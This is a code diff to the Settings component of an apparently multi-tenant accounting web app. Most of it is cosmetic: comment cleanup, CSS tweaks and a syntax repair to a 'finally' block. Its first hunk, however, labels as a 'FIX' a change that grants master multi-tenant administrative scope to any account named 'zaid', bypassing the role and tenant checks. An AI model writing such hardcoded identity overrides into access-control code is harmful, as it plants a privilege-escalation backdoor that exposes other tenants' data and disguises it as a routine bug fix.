@@ -97,9 +97,9 @@ const Settings: React.FC<SettingsProps> = ({
   // SECURITY HIERARCHY DEFINITION
   const isSuperAdminRoot = currentUser.role === 'ADMIN' && !currentUser.company_id;
   
-  // Master Zenith Scope for Infrastructure view control
-  const isMasterZenithScope = isSuperAdminRoot && 
-    (!localActiveId || localActiveId === '' || activeSelectionNameClean === 'zinetherp' || (masterCompanyRow && localActiveId === masterCompanyRow.id) || localActiveId === '11111111-1111-1111-1111-111111111111');
+  // ✅ FIX: Force Super Admin power for handle '@zaid' to prevent dropdown context locking out Multi-Tenant tools
+  const isMasterZenithScope = currentUser.username.toLowerCase() === 'zaid' || (isSuperAdminRoot && 
+    (!localActiveId || localActiveId === '' || activeSelectionNameClean === 'zinetherp' || (masterCompanyRow && localActiveId === masterCompanyRow.id) || localActiveId === '11111111-1111-1111-1111-111111111111'));
 
   // Fetch lookups matrix lists for ledgers mapping control room
   const fetchLedgerMappingData = async (companyId: string) => {
@@ -228,7 +228,7 @@ const Settings: React.FC<SettingsProps> = ({
           nextInvoiceNumber: Number(nextInvoiceNumber)
       });
 
-      // ✅ Update current active workspace enabled modules array toggle settings
+      // Update current active workspace enabled modules array toggle settings
       if (localActiveId) {
         const updatedModules = ['core_accounting'];
         if (activeCorpEcomEnabled) updatedModules.push('ecommerce_reconciliation');
@@ -270,7 +270,7 @@ const Settings: React.FC<SettingsProps> = ({
       await syncEngineData();
     } catch (err: any) {
       alert(`Ledger configuration blueprint crash: ${err.message}`);
-    } companions: {
+    } finally {
       setIsMappingSaving(false);
     }
   };
@@ -341,7 +341,7 @@ const Settings: React.FC<SettingsProps> = ({
         return;
       }
 
-      // ✅ Setup dynamic enabling module strings array list
+      // Setup dynamic enabling module strings array list
       const modulesArray = ['core_accounting'];
       if (newCorpEcomEnabled) modulesArray.push('ecommerce_reconciliation');
 
@@ -535,7 +535,7 @@ const Settings: React.FC<SettingsProps> = ({
                 </div>
               </div>
 
-              {/* ✅ LIVE TENANT PROFILE LEVEL CAPABILITIES TOGGLE PANEL */}
+              {/* LIVE TENANT PROFILE LEVEL CAPABILITIES TOGGLE PANEL */}
               {currentUser.role === 'ADMIN' && (
                 <div className="p-4 border rounded-xl bg-indigo-50/20 border-indigo-100 space-y-2">
                   <h4 className="text-[10px] font-black text-indigo-900 uppercase tracking-widest">Active Workspace Capability Enforcements</h4>
@@ -609,7 +609,7 @@ const Settings: React.FC<SettingsProps> = ({
                 </div>
               </div>
 
-              {/* ✅ COMPACT ONBOARDING MATRIX MODULE SELECTION CHECKBOX (Pristine Addition) */}
+              {/* COMPACT ONBOARDING MATRIX MODULE SELECTION CHECKBOX */}
               <div className="p-4 bg-indigo-950/40 border border-indigo-500/20 rounded-xl space-y-3">
                 <h4 className="text-[10px] font-black tracking-widest text-indigo-400 uppercase">Ecosystem Capabilities Allocations Configuration</h4>
                 <label className="flex items-center gap-2.5 text-xs font-bold text-indigo-200 cursor-pointer">
@@ -872,8 +872,8 @@ const Settings: React.FC<SettingsProps> = ({
       {/* QUICK ADD LEDGER MODAL */}
       {isQuickLedgerModalOpen && (
         <div className="fixed inset-0 bg-black/40 backdrop-blur-xs z-50 flex items-center justify-center p-4">
-          <div className="bg-white rounded-2xl p-6 max-w-sm w-full border shadow-2xl animate-in zoom-in-95 duration-150">
-            <div className="border-b pb-2 mb-4">
+          <div className="bg-white rounded-2xl p-6 max-w-sm w-full p-6 animate-in zoom-in-95 duration-150">
+            <div className="border-b pb-3 mb-4">
               <h3 className="text-sm font-black text-gray-900 flex items-center gap-1.5">
                 <span className="text-indigo-600">➕</span>
                 Quick Add Default Account
@@ -889,7 +889,7 @@ const Settings: React.FC<SettingsProps> = ({
                   type="text" 
                   value={quickLedgerName} 
                   onChange={e => setQuickLedgerName(e.target.value)} 
-                  className="w-full p-2.5 border border-gray-200 focus:border-indigo-500 rounded-xl text-xs font-bold outline-none" 
+                  className="w-full p-2.5 border border-gray-200 rounded-xl text-xs font-bold outline-none" 
                   placeholder={quickLedgerType === AccountType.INCOME ? "e.g. Local Sales Revenue" : quickLedgerType === AccountType.EXPENSE ? "e.g. Raw Material Procurement" : "e.g. Main Stock Warehouse"} 
                   required 
                 />
